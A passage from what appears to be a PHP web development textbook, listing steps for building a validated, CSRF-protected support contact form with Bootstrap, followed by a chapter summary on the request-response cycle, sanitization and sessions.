				<li>Create a support contact form with the following specifications: two inputs of type <strong class="source-inline">text</strong>, for name and email, and a text area input for the message. Each of these will have an associated <strong class="source-inline">&lt;label&gt;</strong> element and, if there are errors, these will have to be printed under the input with erroneous data. <p class="callout-heading">Note</p><p class="callout">You can refer to the Bootstrap framework documentation and use the <strong class="source-inline">alerts</strong> component. </p></li>
				<li>Write the code to prevent a standard-level user from sending more than one form a day. Again, you can use the <strong class="source-inline">alerts</strong> components from the Bootstrap framework.</li>
				<li>Secure the form by generating and using a CSRF token. </li>
				<li>On the submit button, we may want to add more form data, so we can know for sure what form we have to process in the PHP scripts; this is very useful when many forms are added on a single HTML page, and each is sending data to the same URL. </li>
				<li>Write the code to display the message list history. You may choose the <strong class="source-inline">card</strong> component and print all of the message details. Each stored history entry will contain the form data (that is, the <strong class="source-inline">form</strong> key) and the time when the form was sent (that is, the <strong class="source-inline">timeAdded</strong> key).</li>
				<li>Write the code to validate the submitted form, and then write the code to refresh the page if the validation is successful.</li>
				<li>Input the code to send the following data to the template: the username (the greeting), the form errors if any, the form CSRF token, and the <strong class="source-inline">sent</strong> forms history.</li>
				<li>Add the form validation logic in a separate method.</li>
				<li>Check for multiple submissions in the case of standard-level users.</li>
				<li>Write the code to display an error message if the user attempts to submit an empty name field.</li>
				<li>Implement email validation using the <strong class="source-inline">filter_var()</strong> function with <strong class="source-inline">FILTER_VALIDATE_EMAIL validation</strong>.</li>
				<li>For the message field, write the code to ensure that the message is least 40 characters long.</li>
				<li>Collect the sanitized form data and store it in the <strong class="source-inline">$form</strong> variable, which is then returned with the <strong class="source-inline">$errors</strong> variable.</li>
				<li>Now we can test our full implementation. You can begin by accessing the Profile page at <strong class="source-inline">http://127.0.0.1:8080/profile</strong> and continue testing for all fields across all pages. <p class="callout-heading">Note</p><p class="callout">The solution to this activity can be found on page 520.</p></li>
			</ol>
			<h1 id="_idParaDest-250"><a id="_idTextAnchor257"/>Summary</h1>
			<p>In this chapter, you learned about an essential component of a web application – the Request-Response cycle of an application. You parsed the most commonly used HTTP methods and you are now able to tell the difference between them. You learned about best practices in terms of data security, code organization, and recommended approaches. You can perform data sanitization and validation as well, and you know how to upload files on a server, authenticate a user, and use a session, among other things. And, of course, you learned how to bootstrap all the examples into a practical piece – a web application.</p>
			<p>We are not done just yet. Data persistence was mentioned several times during this chapter and not in vain. Data persistence is used by every application and represents the essence of why applications exist – to collect, process, and store data. Although we have stored data in this chapter's exercises as well (for example, in sessions or cookies), in the next chapter, we will discuss data for the medium or long term; that is, data stored in files and databases.</p>
		</div>
	</body></html>